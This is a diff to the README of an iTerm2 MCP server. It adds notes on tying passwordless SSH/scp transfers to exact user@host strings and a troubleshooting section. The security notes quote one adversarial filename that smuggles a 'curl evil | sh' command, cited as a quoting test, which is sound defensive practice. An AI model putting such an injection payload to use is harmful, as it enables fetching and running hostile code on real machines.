@@ -123,6 +123,7 @@ pip install iterm2 "mcp[cli]>=1,<2"   # homebrew Python: add --user --break-syst
 2. **Auto-naming on creation**: a tab opened via a profile is registered under the profile name, so later tools can address it by name
 3. **Name addressing uses an MCP-maintained registry** (`~/.config/iterm2-mcp/registry.json`) — in practice, shell integration resets the session title back to an automatic name (e.g. `~ (-zsh)`) after every command via OSC escape sequences, so `session.name` is unreliable; `set_name` is still attempted for a readable tab title, but addressing never depends on it; a live `session.name` prefix match serves as fallback when the registry misses
 4. **Send-only, no exec**: no tool in the set bypasses the terminal screen
+5. **Passwordless transfers are keyed on the exact `user@host` string**: `distribute_key` records which `user@host` it provisioned, and the transfer tools refuse any other spelling (a different user, or an IP swapped for `localhost`/a hostname) with an error that lists the registered forms — the failure mode this prevents is a *silent* stall at a password prompt in a different session or with a different spelling
 
 ## Security notes
 
@@ -130,6 +131,10 @@ pip install iterm2 "mcp[cli]>=1,<2"   # homebrew Python: add --user --break-syst
 - **Shell quoting**: all paths and credentials passed to `scp` / `ssh` in transfer tools are shell-quoted on both the local and the remote command line (verified against adversarial filenames like `x"; curl evil | sh; #.log`).
 - **Host-key trust (TOFU)**: `distribute_key` runs `ssh-keyscan` and writes the returned host key into `known_hosts` without out-of-band verification — the same trust-on-first-use tradeoff `ssh-keyscan` itself makes. If you need protection against a man-in-the-middle on first connect, verify the fingerprint yourself before using the transfer tools.
 - **`distribute_key` grants standing access**: it appends your public key to the server's `authorized_keys`. To revoke, remove the line from `~/.ssh/authorized_keys` on that server.
+
+## Troubleshooting
+
+**"Passwordless works in one session but not another."** Passwordless state lives in two places: your public key in the server's `~/.ssh/authorized_keys` (per **user**) and the host key in your Mac's `~/.ssh/known_hosts` (matched by the **exact host string** you typed). So `root@10.10.10.136` and `mbs@10.10.10.136` are different targets, and `root@localhost` is a different target from `root@10.10.10.136` even on the same machine. Always pass `server_user`/`server_host` exactly as you did in `distribute_key`; since 0.2.4 the transfer tools reject any unregistered spelling with an error listing the registered ones.
 
 ## Verification
 
